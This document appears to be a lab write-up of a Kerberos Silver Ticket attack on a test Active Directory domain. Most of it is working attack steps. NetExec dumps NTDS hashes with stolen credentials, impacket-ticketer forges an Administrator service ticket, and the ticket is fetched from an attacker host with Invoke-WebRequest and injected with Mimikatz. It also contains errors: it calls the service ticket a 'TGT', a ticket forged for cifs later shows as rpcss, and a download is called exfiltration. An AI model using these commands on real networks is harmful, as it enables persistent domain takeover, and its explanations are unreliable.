Persistence Via Service Forgery


Silver Ticket Attack (Persistence via Service Forgery)

  1. 1.

    1. Concept & Objective

Objective: To achieve persistent, undetectable administrative access to a specific target service on a machine (e.g., CIFS on the Domain Controller) without requiring a TGT from the KDC.

Concept: Unlike a Golden Ticket which uses the krbtgt hash to forge a TGT, a Silver Ticket uses the NTLM hash of a Service Account or a Computer Account (e.g., DC01$) to forge a Service Ticket (TGT).

  • The Advantage: The forged ticket is never sent to the Domain Controller for validation; it is sent directly to the target service. This makes it invisible to KDC-based logging.

  • Scope: It only grants access to the specific service for which the ticket was forged (e.g., cifs, http, rpcss).

  1. 2.

    2. Prerequisites (Reconnaissance & Credential Theft)

To forge a Silver Ticket, we required five critical pieces of information:

  1. Target Service (SPN): cifs/dc01.shinobi.local

  1. Target Host FQDN: dc01.shinobi.local

  1. Domain SID: Obtained via impacket-lookupsid.

  1. Target Account RID: The SID suffix of the user we wish to impersonate (e.g., Administrator = 500).

  1. Service/Computer Hash: The NTLM hash of the target computer account (DC01$).

Step 1: Extracting Target Machine Hash

Tool: NetExec (nxc)

Command:

nxc smb 192.168.56.10 -u 'gojo_satoru69' -p 'Infinity@SixEyes' --ntds

Findings: Using compromised credentials, we performed a DCSync to dump the NTDS database. We successfully exfiltrated the NTLM hash for the computer account DC01$: 9a145920131671d4eaf401febe74251f.

Step 2: Enumerating Domain SID & RIDs

Tool: impacket-lookupsid Findings: We brute-forced SIDs to map the domain structure. We confirmed the Domain SID is S-1-5-21-4057973084-1432748986-1156288224 and identified the Administrator account (RID 500).

  1. 3.

    3. Attack Execution: Forgery (Kali Linux)

Objective: Forge a Service Ticket for the CIFS service (File System access) on the Domain Controller.

Step 1: Forge the .ccache Ticket

Tool: impacket-ticketer

Command:

impacket-ticketer -nthash 9a145920131671d4eaf401febe74251f -domain-sid S-1-5-21-4057973084-1432748986-1156288224 -domain shinobi.local -spn cifs/dc01.shinobi.local -user-id 500 Administrator

Findings: The tool created a "skeleton" ticket, signed it with the DC01$ hash, and saved it as Administrator.ccache.

Step 2: Convert to Windows Format (.kirbi)

Tool: impacket-ticketConverter Findings: We converted the Linux .ccache format to a Windows-compatible .kirbi file for deployment on the target workstation.

  1. 4.

    4. Attack Verification: Remote Access (Kali Linux)

Objective: Prove the forged ticket grants administrative access to the DC's file shares from the Kali machine.

Step 1: Inject Ticket into Session

Command:

export KRB5CCNAME=Administrator.ccache

Findings: The environment variable was set, instructing Impacket tools to use the forged ticket for authentication.

Step 2: Accessing DC Shares (Pass-the-Ticket)

Tool: impacket-smbclient Command:

impacket-smbclient -k -no-pass dc01.shinobi.local

Findings: We successfully authenticated to the Domain Controller using Kerberos only (no password). We were able to list high-privileged shares including ADMIN$, C$, and SYSVOL, confirming a full compromise of the file system.

  1. 5.

    5. Deployment to Windows Host

Objective: Transfer the payload to the compromised workstation (WRS01) for local injection.

Step 1: Exfiltration via Web Request

Tool: Invoke-WebRequest

Command:

Invoke-WebRequest -Uri "http://192.168.56.50:8000/ticket.kirbi" -OutFile ticket.kirbi

Findings: The forged ticket.kirbi was successfully downloaded to C:\Users\gojo_satoru69\Downloads.

Step 2: Memory Injection (Mimikatz)

Tool: mimikatz.exe

Command: kerberos::ptt ticket.kirbi Findings: Mimikatz successfully submitted the ticket for the current session. A klist check revealed the ticket is for the rpcss service and has a 10-year lifespan (valid until 2036).

Step 3: Final Access Verification

Findings: With the ticket injected, the user successfully listed the C$ and ADMIN$ shares on DC01 natively, confirming the bypass of security controls.
